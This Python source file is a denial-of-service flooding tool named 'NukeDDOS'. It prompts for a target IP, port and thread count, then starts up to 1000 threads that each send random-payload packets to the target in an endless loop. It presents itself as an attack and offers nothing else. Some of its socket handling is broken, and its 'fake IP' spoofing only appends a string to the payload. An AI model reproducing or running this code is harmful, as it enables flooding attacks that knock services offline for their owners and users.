import os
import time
import socket
import random
import threading
import struct
from datetime import datetime

# Constants
PACKET_TYPES = (
    ("UDP", socket.SOCK_DGRAM),
    ("RAW", socket.SOCK_RAW),
    ("ICMP", socket.SOCK_RAW),
    ("TCP", socket.SOCK_STREAM)
)

MAX_THREADS = 1000
PACKET_SIZE = 2048
BUFFER_SIZE = 8192

def clear_screen():
    os.system("clear && figlet -f slant NukeDDOS")

def show_banner():
    print("Author   : Laila19")
    print("GitHub   : https://github.com/lailacypher")
    print()

def get_target_info():
    ip = input("Target IP : ").strip()
    port = int(input("Port      : ").strip())
    threads = int(input("Threads   : ").strip())
    return ip, port, min(threads, MAX_THREADS)

def select_packet_type():
    print("\nSelect packet type:")
    for i, (packet_name, _) in enumerate(PACKET_TYPES, 1):
        print(f"{i}. {packet_name}")
    type_choice = int(input("Packet Type (1-4): ").strip()) - 1
    return PACKET_TYPES[type_choice]

def random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

class DDoSAttack:
    def __init__(self):
        self.sent_packets = 0
        self.lock = threading.Lock()
        self.running = True
        self.thread_pool = []

    def show_progress(self):
        clear_screen()
        print("Attack Starting")
        print("[====================] 100%")

    def attack(self, target_ip, target_port, packet_type):
        target = (target_ip, target_port)
        packet_name, sock_type = packet_type
        
        while self.running:
            try:
                with socket.socket(socket.AF_INET, sock_type, 
                                socket.IPPROTO_UDP if packet_name == "UDP" else 0) as sock:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
                    
                    fake_ip = random_ip()
                    packet = random._urandom(PACKET_SIZE) + fake_ip.encode()
                    
                    for _ in range(5):
                        try:
                            sock.sendto(packet[:512], target)
                            sock.sendto(packet[512:1024], target)
                            sock.sendto(packet[1024:1536], target)
                            sock.sendto(packet[1536:], target)
                            
                            with self.lock:
                                self.sent_packets += 5
                                if self.sent_packets % 100 == 0:
                                    print(f"Packets {self.sent_packets} sent to {target_ip}:{target_port}")
                                    
                            time.sleep(0.01)
                            
                        except (ConnectionResetError, BrokenPipeError):
                            break
                            
            except Exception as e:
                print(f"Error: {str(e)[:50]}")
                time.sleep(1)

    def start(self, target_ip, target_port, packet_type, num_threads):
        self.show_progress()
        
        for _ in range(num_threads):
            thread = threading.Thread(target=self.attack, 
                                     args=(target_ip, target_port, packet_type),
                                     daemon=True)
            thread.start()
            self.thread_pool.append(thread)

    def stop(self):
        self.running = False
        for thread in self.thread_pool:
            thread.join(timeout=1)
        print("\nAttack stopped cleanly")

def main():
    try:
        clear_screen()
        show_banner()
        
        target_ip, target_port, num_threads = get_target_info()
        packet_type = select_packet_type()
        
        attack = DDoSAttack()
        attack.start(target_ip, target_port, packet_type, num_threads)
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        attack.stop()
    except Exception as e:
        print(f"Fatal error: {str(e)}")
        attack.stop()

if __name__ == "__main__":
    main()
